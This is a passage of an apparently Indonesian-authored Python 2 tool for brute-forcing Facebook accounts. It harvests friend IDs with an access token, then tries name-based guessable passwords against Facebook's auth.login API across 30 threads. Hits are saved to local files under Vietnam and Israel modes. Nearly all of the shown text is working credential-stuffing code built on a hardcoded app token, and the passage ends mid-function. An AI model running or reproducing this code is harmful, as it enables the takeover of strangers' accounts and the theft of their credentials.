		print "\033[1;93m \     \____|  |   | \_\ \ \033[1;97m[\033[1;94m F\033[1;97m ]\033[1;94m > \033[1;97mForce"
		print "\033[1;91m  \______  /|__|   |___  /"
		print "\033[1;91m         \/            \/ "
		try:
			print 50* "\033[1;94m─"
			print ("             \033[1;94m>>> \033[1;93mCRACK VIETNAM \033[1;94m<<<")
			print 50* "\033[1;94m─"
			idlist = raw_input('\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mNama File\033[1;91m :\033[1;97m ')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except KeyError:
			print '\033[1;97m(\033[1;91m!\033[1;97m) File tidak ada ! '
			raw_input('\n\033[1;97m(\033[1;91mKembali \033[1;97m)')
		except IOError:
			print '\033[1;97m(\033[1;91m!\033[1;97m) File tidak ada !'
			raw_input("\n\033[1;97m(\033[1;91mKembali\033[1;97m)")
			crack_viet()
	elif teak =="0" or teak =="00":
		menu()
	else:
		print"\033[1;97m(\033[1;91m!\033[1;97m) Isi Yg Benar Sayang!"
		pilih_viet()
	
	print "\033[0;97m(\033[0;94m•\033[0;97m) Total ID\033[1;91m  :\033[1;97m "+str(len(id))
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[0;97m(\033[0;94m•\033[0;97m) Crack Berjalan "+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;94m──────────────────────────────────────────────────"
	print "\033[0;97m(\033[0;94m•\033[0;97m) UNTUK MENGHENTIKAN PROSES,TEKAN CTRL+Z PAHAM!\033[0m"
	print "\033[0;97m(\033[0;94m•\033[0;97m) TIDAK ADA HASIL GUNAKAN MODE PESAWAT 3 DETIK!\033[0m"
	print 50* "\033[1;94m─"
	
##### MAIN vietnam #####
	def main(arg):
		global cekpoint,oks
		zowe = arg
		try:
			sys.stdout.write("\r{}".format(datetime.now().strftime("\033[1;97m%H\033[1;97m:\033[1;97m%M\033[1;97m:\033[1;97m%S")));sys.stdout.flush()
			os.mkdir('done')
		except OSError:
			pass
		try:
			an = requests.get('https://graph.facebook.com/'+zowe+'/?access_token='+toket)
			j = json.loads(an.text)
			bos1 = j['first_name'].lower()+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			ko = json.load(data)
			if 'access_token' in ko:
				print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
				print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
				print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
				print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos1
				oke = open("done/viet.txt", "a")
				oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
				oke.close()
				oks.append(zowe)
			else:
				if 'www.facebook.com' in ko['error_msg']:
					print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
					print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
					print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
					print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos1
					cek = open("done/viet.txt", "a")
					cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
					cek.close()
					cekpoint.append(zowe)
				else:
					bos2 = j['first_name'].lower()+'12345'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					ko = json.load(data)
					if 'access_token' in ko:
						print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
						print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
						print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
						print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos2
						oke = open("done/viet.txt", "a")
						oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
						oke.close()
						oks.append(zowe)
					else:
						if 'www.facebook.com' in ko['error_msg']:
							print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
							print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
							print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
							print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos2
							cek = open("done/viet.txt", "a")
							cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
							cek.close()
							cekpoint.append(zowe)
						else:
							bos3 = j['first_name'].lower()+'1234'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							ko = json.load(data)
							if 'access_token' in ko:
								print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
								print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
								print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
								print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos3
								oke = open("done/viet.txt", "a")
								oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos3+"\n")
								oke.close()
								oks.append(zowe)
							else:
								if 'www.facebook.com' in ko['error_msg']:
									print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
									print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
									print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
									print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos3
									cek = open("done/viet.txt", "a")
									cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos3+"\n")
									cek.close()
									cekpoint.append(zowe)
								else:
									bos4 = ('password')
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									ko = json.load(data)
									if 'access_token' in ko:
										print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
										print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
										print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
										print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos4
										oke = open("done/viet.txt", "a")
										oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
										oke.close()
										oks.append(zowe)
									else:
										if 'www.facebook.com' in ko['error_msg']:
											print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
											print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
											print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
											print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos4
											cek = open("done/viet.txt", "a")
											cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
											cek.close()
											cekpoint.append(zowe)
										else:
											bos5 = j['first_name'].lower()+'321'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											ko = json.load(data)
											if 'access_token' in ko:
												print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
												print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
												print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
												print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos5
												oke = open("done/viet.txt", "a")
												oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos5+"\n")
												oke.close()
												oks.append(zowe)
											else:
												if 'www.facebook.com' in ko['error_msg']:
													print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
													print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
													print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
													print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos5
													cek = open("done/viet.txt", "a")
													cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos5+"\n")
													cek.close()
													cekpoint.append(zowe)
												else:
													bos6 = j['first_name'].lower()+'12345'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													ko = json.load(data)
													if 'access_token' in ko:
														print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
														print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
														print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
														print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos6
														oke = open("done/viet.txt", "a")
														oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos6+"\n")
														oke.close()
														oks.append(zowe)
													else:
														if 'www.facebook.com' in ko['error_msg']:
															print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
															print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
															print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
															print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos6
															cek = open("done/viet.txt", "a")
															cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos6+"\n")
															cek.close()
															cekpoint.append(zowe)
														else:
															bos7 = j['first_name'].lower()+'123'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															ko = json.load(data)
															if 'access_token' in ko:
																print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
																print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
																print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
																print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos7
																oke = open("done/viet.txt", "a")
																oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos7+"\n")
																oke.close()
																oks.append(zowe)
															else:
																if 'www.facebook.com' in ko['error_msg']:
																	print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
																	print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
																	print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
																	print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos7
																	cek = open("done/viet.txt", "a")
																	cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos7+"\n")
																	cek.close()
																	cekpoint.append(zowe)
																else:
																	bos8 = j['last_name'].lower()+'12345'
																	data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																	ko = json.load(data)
																	if 'access_token' in ko:
																		print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
																		print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
																		print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
																		print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos8
																		oke = open("done/viet.txt", "a")
																		oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos8+"\n")
																		oke.close()
																		oks.append(zowe)
																	else:
																		if 'www.facebook.com' in ko['error_msg']:
																			print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
																			print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
																			print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
																			print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos8
																			cek = open("done/viet.txt", "a")
																			cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos8+"\n")
																			cek.close()
																			cekpoint.append(zowe)
																			
		except:
			pass
			
	p = ThreadPool(30)
	p.map(main, id)
	print "\n\033[1;94m──────────────────────────────────────────────────"
	print '\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mSelesai ...'
	print"\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mTotal \033[1;92mOK\033[1;97m/\x1b[1;93mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
	print '\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mSalin hasil crack lalu simpan\033[1;91m : \033[1;97mdone viet.'
	print 50* "\033[1;94m─"
	raw_input("\033[1;97m(\033[1;91mKembali\033[1;97m) ")
	os.system("python2 Crack.py")
	
	##### CRACK israel #####
def crack_israel():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;97m(\033[1;91m!\033[1;97m) Token invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print " "
	print "\033[1;94m _________   ________.    "
	print "\033[1;91m \_   ___ \_/ ____\_ |__   \033[1;97m[\033[1;94m M\033[1;97m ]\033[1;94m > \033[1;97mMulti"
	print "\033[1;94m /    \  \/\   __\ | __ \  \033[1;97m[\033[1;94m B\033[1;97m ]\033[1;94m > \033[1;97mBrute"
	print "\033[1;94m \     \____|  |   | \_\ \ \033[1;97m[\033[1;94m F\033[1;97m ]\033[1;94m > \033[1;97mForce"
	print "\033[1;91m  \______  /|__|   |___  /"
	print "\033[1;94m         \/            \/ "
	print 50* "\033[1;94m─"
	print "\033[1;94m────────────────────\033[1;97m(\033[1;93mIsrael\033[1;97m)\033[1;94m──────────────────────"
	print 50* "\033[1;94m─"
	print "\033[1;94m(\033[1;97m1\033[1;94m) \033[1;97mCrack Dari Daftar Teman"
	print "\033[1;94m(\033[1;97m2\033[1;94m)\033[1;97m Crack Dari Id Teman/Publik"
	print "\033[1;94m(\033[1;97m3\033[1;94m)\033[1;97m Crack Dari File"
	print "\033[1;94m(\033[1;91m0\033[1;94m) \033[1;97mKembali"
	print 50* "\033[1;94m─"
	pilih_israel()

#### PILIH Israel ####
def pilih_israel():
	teak = raw_input("\033[1;97m(?) Pilih \033[94m> \033[1;97m ")
	if teak =="":
		print"\033[1;97m(\033[1;91m!\033[1;97m) Isi Yg Benar Sayang!"
		pilih_israel()
	elif teak =="1" or teak =="01":
		os.system('clear')
		print " "
		print "\033[1;94m _________   ________.    "
		print "\033[1;91m \_   ___ \_/ ____\_ |__   \033[1;97m[\033[1;94m M\033[1;97m ]\033[1;94m > \033[1;97mMulti"
		print "\033[1;94m /    \  \/\   __\ | __ \  \033[1;97m[\033[1;94m B\033[1;97m ]\033[1;94m > \033[1;97mBrute"
		print "\033[1;94m \     \____|  |   | \_\ \ \033[1;97m[\033[1;94m F\033[1;97m ]\033[1;94m > \033[1;97mForce"
		print "\033[1;91m  \______  /|__|   |___  /"
		print "\033[1;94m         \/            \/ "
		print 50* "\033[1;94m─"
		print ("             \033[1;94m>>> \033[1;93mCRACK ISRAEL \033[1;94m<<<")
		print 50* "\033[1;94m─"
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif teak =="2" or teak =="02":
		os.system('clear')
		print " "
		print "\033[1;94m _________   ________.    "
		print "\033[1;91m \_   ___ \_/ ____\_ |__   \033[1;97m[\033[1;94m M\033[1;97m ]\033[1;94m > \033[1;97mMulti"
		print "\033[1;94m /    \  \/\   __\ | __ \  \033[1;97m[\033[1;94m B\033[1;97m ]\033[1;94m > \033[1;97mBrute"
		print "\033[1;94m \     \____|  |   | \_\ \ \033[1;97m[\033[1;94m F\033[1;97m ]\033[1;94m > \033[1;97mForce"
		print "\033[1;91m  \______  /|__|   |___  /"
		print "\033[1;94m         \/            \/ "
		print 50* "\033[1;94m─"
		print ("             \033[1;94m>>> \033[1;93mCRACK ISRAEL \033[1;94m<<<")
		print 50* "\033[1;94m─"
		idt = raw_input("\033[1;97m(\033[1;94m•\033[1;97m) ID Publik \033[1;91m:\033[1;97m ")
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			sp = json.loads(pok.text)
			print"\033[1;97m(\033[1;94m•\033[1;97m) Nama Akun \033[1;91m:\033[1;97m "+sp["name"]
		except KeyError:
			print"\033[1;97m(\033[1;91m!\033[1;97m) ID publik Tidak Ada!"
			raw_input("\n\033[1;97m(\033[1;91mKembali\033[1;97m)")
			crack_israel()
		except requests.exceptions.ConnectionError:
			print"\033[1;97m(\033[1;91m!\033[1;97m) Tidak ada koneksi !"
			keluar()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif teak =="3" or teak =="03":
		os.system('clear')
		print " "
		print "\033[1;94m _________   ________.    "
		print "\033[1;91m \_   ___ \_/ ____\_ |__   \033[1;97m[\033[1;94m M\033[1;97m ]\033[1;94m > \033[1;97mMulti"
		print "\033[1;94m /    \  \/\   __\ | __ \  \033[1;97m[\033[1;94m B\033[1;97m ]\033[1;94m > \033[1;97mBrute"
		print "\033[1;94m \     \____|  |   | \_\ \ \033[1;97m[\033[1;94m F\033[1;97m ]\033[1;94m > \033[1;97mForce"
		print "\033[1;91m  \______  /|__|   |___  /"
		print "\033[1;94m         \/            \/ "
		try:
			print 50* "\033[1;94m─"
			print ("             \033[1;94m>>> \033[1;93mCRACK ISRAEL \033[1;94m<<<")
			print 50* "\033[1;94m─"
			idlist = raw_input('\033[1;97m(\033[1;94m•\033[1;97m) \033[1;97mNama File\033[1;91m :\033[1;97m ')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except KeyError:
			print '\033[1;97m(\033[1;91m!\033[1;97m) File tidak ada ! '
			raw_input('\n\033[1;97m(\033[1;91mKembali \033[1;97m)')
		except IOError:
			print '\033[1;97m(\033[1;91m!\033[1;97m) File tidak ada !'
			raw_input("\n\033[1;97m(\033[1;91mKembali\033[1;97m)")
			crack_israel()
	elif teak =="0" or teak =="00":
		menu()
	else:
		print"\033[1;97m(\033[1;91m!\033[1;97m) Isi Yg Benar Sayang!"
		pilih_israel()
	
	print "\033[0;97m(\033[0;94m•\033[0;97m) Total ID\033[1;91m  :\033[1;97m "+str(len(id))
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\033[0;97m(\033[0;94m•\033[0;97m) Crack Berjalan "+o),;sys.stdout.flush();time.sleep(1)
	print "\n\033[1;94m──────────────────────────────────────────────────"
	print "\033[0;97m(\033[0;94m•\033[0;97m) UNTUK MENGHENTIKAN PROSES,TEKAN CTRL+Z PAHAM!\033[0m"
	print "\033[0;97m(\033[0;94m•\033[0;97m) TIDAK ADA HASIL GUNAKAN MODE PESAWAT 3 DETIK!\033[0m"
	print 50* "\033[1;94m─"
	
##### MAIN Israel #####
	def main(arg):
		global cekpoint,oks
		zowe = arg
		try:
			sys.stdout.write("\r{}".format(datetime.now().strftime("\033[1;97m%H\033[1;97m:\033[1;97m%M\033[1;97m:\033[1;97m%S")));sys.stdout.flush()
			os.mkdir('done')
		except OSError:
			pass
		try:
			an = requests.get('https://graph.facebook.com/'+zowe+'/?access_token='+toket)
			j = json.loads(an.text)
			bos1 = j['first_name'].lower()+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			ko = json.load(data)
			if 'access_token' in ko:
				print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
				print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
				print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
				print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos1
				oke = open("done/israel.txt", "a")
				oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
				oke.close()
				oks.append(zowe)
			else:
				if 'www.facebook.com' in ko['error_msg']:
					print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
					print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
					print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
					print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos1
					cek = open("done/israel.txt", "a")
					cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
					cek.close()
					cekpoint.append(zowe)
				else:
					bos2 = j['first_name'].lower()+'12345'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					ko = json.load(data)
					if 'access_token' in ko:
						print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
						print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
						print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
						print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos2
						oke = open("done/israel.txt", "a")
						oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
						oke.close()
						oks.append(zowe)
					else:
						if 'www.facebook.com' in ko['error_msg']:
							print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
							print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
							print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
							print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos2
							cek = open("done/israel.txt", "a")
							cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
							cek.close()
							cekpoint.append(zowe)
						else:
							bos3 = j['first_name'].lower()+'1234'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							ko = json.load(data)
							if 'access_token' in ko:
								print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;92mBERHASIL")
								print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
								print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
								print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos3
								oke = open("done/israel.txt", "a")
								oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos3+"\n")
								oke.close()
								oks.append(zowe)
							else:
								if 'www.facebook.com' in ko['error_msg']:
									print ("\n\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) \x1b[1;93mCEKPOINT")
									print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Nama  \x1b[1;94m    > \x1b[1;97m") + j['name']
									print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) User  \x1b[1;94m    > \x1b[1;97m") + zowe
									print ("\x1b[1;97m(\x1b[1;94m•\x1b[1;97m) Password  \x1b[1;94m> \x1b[1;97m") + bos3
									cek = open("done/israel.txt", "a")
